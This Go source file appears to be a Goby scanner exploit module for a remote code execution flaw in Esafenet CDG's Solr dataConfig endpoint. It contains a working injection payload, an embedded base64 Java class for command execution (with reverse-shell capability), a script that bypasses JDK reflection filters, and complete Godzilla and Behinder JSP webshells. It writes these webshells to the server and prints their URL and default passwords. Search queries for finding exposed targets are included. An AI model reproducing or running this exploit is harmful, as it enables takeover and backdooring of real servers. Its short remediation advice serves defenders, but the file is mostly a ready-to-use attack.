package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>Esafenet CDG is an electronic document security protection software, developed by Beijing Yisaitong Technology Development Co., LTD.</p><p>Code execution exists in dataConfig parameter of Esafenet CDG. Attackers can use this vulnerability to execute arbitrary code and obtain server permissions, which is extremely harmful.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2020-08-06",
    "Author": "Sanyuee1@163.com",
    "FofaQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "GobyQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "Level": "3",
    "Impact": "<p>Attackers can arbitrarily execute code on the server side through this vulnerability, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Configure solr dataConfig to allow only the back-end solr configuration file to take effect.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "cmd",
            "Type": "input",
            "Value": "ls",
            "name": "attackType",
            "value": "cmd,webshell",
            "type": "select"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.txt",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "dfsre18661",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "shterm-Fortres-Machine"
        ]
    },
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "VulType": [
        "Code Execution",
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 dataConfig 远程代码执行漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统是一款电子文档安全防护软件，由北京亿赛通科技发展有限责任公司开发。</p><p>亿赛通电子文档安全管理系统 dataConfig 参数存在代码执行，攻击者可利用此漏洞执行任意代码，获取服务器权限，危害极大。</p>",
            "Recommendation": "<p>1、配置 solr dataConfig 参数，仅允许后端 solr 配置文件生效。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行",
                "文件上传"
            ],
            "Tags": [
                "代码执行",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Esafenet CDG dataConfig remote code execution vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>Esafenet CDG is an electronic document security protection software, developed by Beijing Yisaitong Technology Development Co., LTD.</p><p>Code execution exists in dataConfig parameter of Esafenet CDG. Attackers can use this vulnerability to execute arbitrary code and obtain server permissions, which is extremely harmful.</p>",
            "Recommendation": "<p>1. Configure solr dataConfig to allow only the back-end solr configuration file to take effect.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Attackers can arbitrarily execute code on the server side through this vulnerability, write a backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution",
                "File Upload"
            ],
            "Tags": [
                "Code Execution",
                "File Upload"
            ]
        }
    },
    "Name": "Esafenet CDG dataConfig remote code execution vulnerability",
    "PostTime": "2023-09-03",
    "Is0day": false,
    "PocId": "10866"
}`

	base64EncodeIH3261SDsds := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}
	sendRequestUjdss2615 := func(u *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		uriPayload := `<dataConfig>
    <dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />
    <script><![CDATA[` + payload + `]]></script>
    <document>
        <entity stream="true" name="entity1" datasource="streamsrc1" processor="XPathEntityProcessor" rootEntity="true"
            forEach="/RDF/item" transformer="script:poc">
            <field column="title" xpath="/RDF/item/title" />
        </entity>
    </document>
</dataConfig>`
		uri := "/solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=" + url.QueryEscape(uriPayload)
		postConfig := httpclient.NewPostRequestConfig(uri)
		postConfig.Header.Store("Accept", "*/*")
		postConfig.Data = fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n    <RDF>\r\n        <item/>\r\n    </RDF>")
		resp1, err1 := httpclient.DoHttpRequest(u, postConfig)
		return resp1, err1
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			bytecode := "yv66vgAAADEA7AoATQBcCgBdAF4HAF8KAGAAYQoAYABiCgBjAGQIAGUKACEAZggAZwoAIQBoCABpCgAhAGoKACEAawgAbAoAIQBtCABuCgBvAHAKAEwAcQgAcgoATABzCAB0CgB1AHYKACEAdwgAeAoAIQB5CAB6CAB7BwB8CgAcAFwKABwAfQgAfgoAHAB/BwCACACBCACCCACDCACECACFCgCGAIcKAIYAiAcAiQoAigCLCgApAIwIAI0KACkAjgoAKQCPCgApAJAKAIoAkQoAigCSBwCTCgAyAH8IAJQKACEAlQgAlgoAhgCXBwCYCgBvAJkKADgAmgoAOACLCgCKAJsKADgAmwoAOACcCgCdAJ4KAJ0AnwoAoAChCgCgAKIFAAAAAAAAADIKAGAAowoAigCkCgA4AKUIAKYKADIApwgAqAgAqQcAqgcAqwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAKRXhjZXB0aW9ucwEAB2V4ZWN1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBAAdyZXZlcnNlAQA5KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvSW50ZWdlcjspTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAB0E0LmphdmEMAE4ATwcArAwArQBTAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAK4MAK8AsAwAsQCyBwCzDABSAFMBAAAMALQAtQEAEGNvbW1hbmQgbm90IG51bGwMALYAtwEABSMjIyMjDAC4ALkMALoAuwEAAToMALwAvQEAImNvbW1hbmQgcmV2ZXJzZSBob3N0IGZvcm1hdCBlcnJvciEHAL4MAL8AwAwAWABZAQAFQEBAQEAMAFcAVgEAB29zLm5hbWUHAMEMAMIAVgwAwwC3AQADd2luDADEAMUBAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAxgDHAQAFIC1uIDQMAMgAtwEAEGphdmEvbGFuZy9TdHJpbmcBAANjbWQBAAIvYwEABSAtdCA0AQACc2gBAAItYwcAyQwAygDLDABXAMwBABFqYXZhL3V0aWwvU2Nhbm5lcgcAzQwAzgDPDABOANABAAJcYQwA0QDSDADTANQMANUAtwwA1gDPDADXAE8BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAHL2Jpbi9zaAwATgDYAQAHY21kLmV4ZQwAVwDZAQAPamF2YS9uZXQvU29ja2V0DADaANsMAE4A3AwA3QDeDADfANQHAOAMAOEA2wwA4gDbBwDjDADkAOUMAOYATwwA5wDoDADpANsMAOoATwEAHXJldmVyc2UgZXhlY3V0ZSBlcnJvciwgbXNnIC0+DADrALcBAAEhAQATcmV2ZXJzZSBleGVjdXRlIG9rIQEAAkE0AQAQamF2YS9sYW5nL09iamVjdAEAD2phdmEvbGFuZy9DbGFzcwEAB2Zvck5hbWUBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABHRyaW0BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAHdmFsdWVPZgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9JbnRlZ2VyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEADmdldEVycm9yU3RyZWFtAQAHZGVzdHJveQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGludFZhbHVlAQADKClJAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQATamF2YS9pby9JbnB1dFN0cmVhbQEACWF2YWlsYWJsZQEABHJlYWQBABRqYXZhL2lvL091dHB1dFN0cmVhbQEABXdyaXRlAQAEKEkpVgEABWZsdXNoAQAFc2xlZXABAAQoSilWAQAJZXhpdFZhbHVlAQAFY2xvc2UBAApnZXRNZXNzYWdlACEATABNAAAAAAAFAAEATgBPAAEAUAAAAB0AAQABAAAABSq3AAGxAAAAAQBRAAAABgABAAAADAABAFIAUwACAFAAAAA5AAIAAwAAABEruAACsE24AAS2AAUrtgAGsAABAAAABAAFAAMAAQBRAAAADgADAAAAFgAFABcABgAYAFQAAAAEAAEAAwABAFUAVgABAFAAAACPAAQAAwAAAFcrxgAMEgcrtgAImQAGEgmwK7YACkwrEgu2AAyZACgrEgsSB7YADRIOtgAPTSy+BZ8ABhIQsCosAzIsBDK4ABG2ABKwKisSCxIHtgANEhMSB7YADbYAFLAAAAABAFEAAAAmAAkAAAAjAA0AJAAQACYAFQAnAB4AKQAsACoAMgArADUALQBDAC8AAQBXAFYAAQBQAAABwgAEAAkAAAEqEhW4ABa2ABdNK7YACkwBTgE6BCwSGLYAGZkAQCsSGrYAGZkAICsSG7YAGZoAF7sAHFm3AB0rtgAeEh+2AB62ACBMBr0AIVkDEiJTWQQSI1NZBStTOgSnAD0rEhq2ABmZACArEhu2ABmaABe7ABxZtwAdK7YAHhIktgAetgAgTAa9ACFZAxIlU1kEEiZTWQUrUzoEuAAnGQS2AChOuwApWS22ACq3ACsSLLYALToFGQW2AC6ZAAsZBbYAL6cABRIHOga7AClZLbYAMLcAKxIstgAtOgW7ABxZtwAdGQa2AB4ZBbYALpkACxkFtgAvpwAFEge2AB62ACA6BhkGOgctxgAHLbYAMRkHsDoFGQW2ADM6Bi3GAActtgAxGQawOggtxgAHLbYAMRkIvwAEAJMA/gEJADIAkwD+AR0AAAEJARIBHQAAAR0BHwEdAAAAAQBRAAAAZgAZAAAAMwAJADQADgA1ABAANgATADcAHAA4AC4AOQBCADsAWQA9AGsAPgB/AEAAkwBDAJwARACuAEUAwgBGANQARwD6AEgA/gBMAQIATQEJAEkBCwBKARIATAEWAE0BHQBMASMATQABAFgAWQABAFAAAAGDAAQADAAAAPMSFbgAFrYAFxIYtgAZmgAQuwAhWRI0twA1TqcADbsAIVkSNrcANU64ACcttgA3OgS7ADhZKyy2ADm3ADo6BRkEtgAqOgYZBLYAMDoHGQW2ADs6CBkEtgA8OgkZBbYAPToKGQW2AD6aAGAZBrYAP54AEBkKGQa2AEC2AEGn/+4ZB7YAP54AEBkKGQe2AEC2AEGn/+4ZCLYAP54AEBkJGQi2AEC2AEGn/+4ZCrYAQhkJtgBCFABDuABFGQS2AEZXpwAIOgun/54ZBLYAMRkFtgBHpwAgTrsAHFm3AB0SSLYAHi22AEm2AB4SSrYAHrYAILASS7AAAgC4AL4AwQAyAAAA0ADTADIAAQBRAAAAbgAbAAAAXAAQAF0AHQBfACcAYQAwAGIAPgBjAFMAZABhAGUAaQBmAHEAZwB+AGkAhgBqAJMAbACbAG0AqABvAK0AcACyAHEAuABzAL4AdADBAHUAwwB2AMYAeADLAHkA0AB8ANMAegDUAHsA8AB9AAEAWgAAAAIAWw=="
			payload := `function poc(res) {
            try {
                load("nashorn:mozilla_compat.js");
            } catch (e) { }
            java.lang.System.setProperty("a", "` + bytecode + `");
            try {
                res.put("title", "ok");  
            } catch (e) {
                res.put("title", e.toString());
            }
            return res;
        }`
			resp, err := sendRequestUjdss2615(hostInfo, payload)
			if err != nil {
				return false
			}
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "ok") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var filename, content string
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			webshell := goutils.B2S(stepLogs.Params["webshell"])
			if attackType == "cmd" {
				cmd := stepLogs.Params["cmd"].(string)
				payload := `
function removeClassCache(clazz) {
    var unsafe = getUnsafe();
    var clazzAnonymousClass = unsafe.defineAnonymousClass(clazz, java.lang.Class.forName("java.lang.Class").getResourceAsStream("Class.class").readAllBytes(), null);
    var reflectionDataField = clazzAnonymousClass.getDeclaredField("reflectionData");
    unsafe.putObject(clazz, unsafe.objectFieldOffset(reflectionDataField), null);
}

function bypassReflectionFilter() {
    var reflectionClass;
    try {
        reflectionClass = java.lang.Class.forName("jdk.internal.reflect.Reflection");
    } catch (error) {
        reflectionClass = java.lang.Class.forName("sun.reflect.Reflection");
    }
    var unsafe = getUnsafe();
    var classBuffer = reflectionClass.getResourceAsStream("Reflection.class").readAllBytes();
    var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);
    var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
    var methodFilterMapField = reflectionAnonymousClass.getDeclaredField("methodFilterMap");
    if (fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
        unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
    }
    if (methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
        unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(methodFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
    }
    removeClassCache(java.lang.Class.forName("java.lang.Class"));
}

function base64DecodeToByte(str) {
    var bt;
    try {
        bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
    } catch (e) { }
    if (bt == null) {
        try {
            bt = java.lang.Class.forName("java.util.Base64").newInstance().getDecoder().decode(str);
        } catch (e) { }
    }
    if (bt == null) {
        try {
            bt = java.util.Base64.getDecoder().decode(str);
        } catch (e) { }
    }
    if (bt == null) {
        bt = java.lang.Class.forName("org.apache.commons.codec.binary.Base64").newInstance().decode(str);
    }
    return bt;
}

function defineClass(bytes) {
    var clz = null;
    var version = java.lang.System.getProperty("java.version");
    var unsafe = getUnsafe();
    var classLoader = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0));
    try {
        if (version.split(".")[0] >= 11) {
            bypassReflectionFilter();
            defineClassMethod = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", java.lang.Class.forName("[B"), java.lang.Integer.TYPE, java.lang.Integer.TYPE);
            setAccessible(defineClassMethod);
            clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
        } else {
            var protectionDomain = new java.security.ProtectionDomain(new java.security.CodeSource(null, java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.security.cert.Certificate"), 0)), null, classLoader, []);
            clz = unsafe.defineClass(null, bytes, 0, bytes.length, classLoader, protectionDomain);
        }
    } catch (error) {
        error.printStackTrace();
    } finally {
        return clz;
    }
}

function setAccessible(accessibleObject) {
    var unsafe = getUnsafe();
    var overrideField = java.lang.Class.forName("java.lang.reflect.AccessibleObject").getDeclaredField("override");
    var offset = unsafe.objectFieldOffset(overrideField);
    unsafe.putBoolean(accessibleObject, offset, true);
}

function getUnsafe() {
    var theUnsafeMethod = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
    theUnsafeMethod.setAccessible(true);
    return theUnsafeMethod.get(null);
}

function poc(res) {
    try {
        load("nashorn:mozilla_compat.js");
    } catch (e) { }

    try {
        var A4 = defineClass(base64DecodeToByte(java.lang.System.getProperty("a"))).newInstance();
        res.put("title", A4.exec("` + cmd + `"));
    } catch (e) {
        res.put("title", e.toString());
    }
    return res;
}
`
				resp, err := sendRequestUjdss2615(expResult.HostInfo, payload)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if resp.StatusCode == 200 {
					results := resp.Utf8Html
					startIndex := strings.Index(fmt.Sprintf("%x", resp.Utf8Html), "746c65223e3c7374723e")
					if startIndex != -1 {
						tempString, _ := hex.DecodeString(fmt.Sprintf("%x", resp.Utf8Html)[startIndex+20:])
						results = string(tempString)
					}
					lastIndex := strings.LastIndex(fmt.Sprintf("%x", results), "0d0a3c2f7374723e3c2f6172723e3c2f6c73743e3c2f6172723e3c")
					if lastIndex != -1 {
						tempString, _ := hex.DecodeString(fmt.Sprintf("%x", results)[:lastIndex])
						results = string(tempString)
					}
					expResult.Output = results
					expResult.Success = true
					return expResult
				}
			} else if attackType == "webshell" {
				filename = goutils.RandomHexString(6) + ".jsp"
				if webshell == "godzilla" {
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){} %>`
				} else if webshell == "behinder" {
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "custom" {
					filename = stepLogs.Params["filename"].(string)
					content = stepLogs.Params["content"].(string)
				} else {
					expResult.Success = false
					expResult.Output = "未知的利用方式"
					return expResult
				}
				payload := `
        function base64DecodeToByte(str) {
            var bt;
            try {
                bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
            } catch (e) { }
            if (bt == null) {
                try {
                    bt = java.lang.Class.forName("java.util.Base64").newInstance().getDecoder().decode(str);
                } catch (e) { }
            }
            if (bt == null) {
                try {
                    bt = java.util.Basea64.getDecoder().decode(str);
                } catch (e) { }
            }
            if (bt == null) {
                bt = java.lang.Class.forName("org.apache.commons.codec.binary.Base64").newInstance().decode(str);
            }
            return bt;
        }
        function poc(res) {
            try {
                load("nashorn:mozilla_compat.js");
            } catch (e) { }
            try {
                var filename = "../webapps/ROOT/` + filename + `";
                var os = new java.io.FileOutputStream(filename);
                var content = base64DecodeToByte("` + base64EncodeIH3261SDsds(content) + `".replace(" ",""));
                os.write(content);
                os.flush();
                os.close();
                res.put("title", "ok");
            } catch (error) {
                res.put("title", e.toString());
            }
            return res;
        }
 `
				resp, err := sendRequestUjdss2615(expResult.HostInfo, payload)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "ok") {
					uri := "/" + filename
					getConfig := httpclient.NewGetRequestConfig(uri)
					resp, err := httpclient.DoHttpRequest(expResult.HostInfo, getConfig)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					} else if resp.StatusCode == 200 || resp.StatusCode == 500 {
						expResult.Success = true
						expResult.Output = fmt.Sprintf("WebShell URL: %s\n", expResult.HostInfo.FixedHostInfo+"/"+filename)
						if webshell == "behinder" {
							expResult.Output += "Password: rebeyond\n"
							expResult.Output += "WebShell tool: Behinder v3.0\n"
						} else if webshell == "godzilla" {
							expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
							expResult.Output += "WebShell tool: Godzilla v4.0.1\n"
						}
						if webshell != "custom" {
							expResult.Output += "Webshell type: JSP"
						}
						return expResult
					}
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}

